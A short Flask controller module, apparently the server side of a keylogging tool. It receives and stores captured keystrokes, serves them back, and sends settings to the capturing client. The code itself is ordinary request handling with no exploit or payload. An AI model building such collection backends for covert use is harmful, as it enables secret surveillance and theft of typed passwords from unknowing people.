from flask import jsonify
import backend.services.logs_service as logs_service

def handle_keystrokes(request):
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
    data = request.get_json()
    settings = handle_get_settings()
    if not data:
        return jsonify({"data": False, "settings": settings}), 200
    try:
        logs_service.save_keystrokes(data)
        return jsonify({"data": True, "settings": settings}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def handle_get_keystrokes(request):
    return logs_service.get_keystrokes(request)

def handle_update_settings(request):
    data = request.get_json()
    return logs_service.update_settings(data)

def handle_get_settings():
    return logs_service.get_settings()
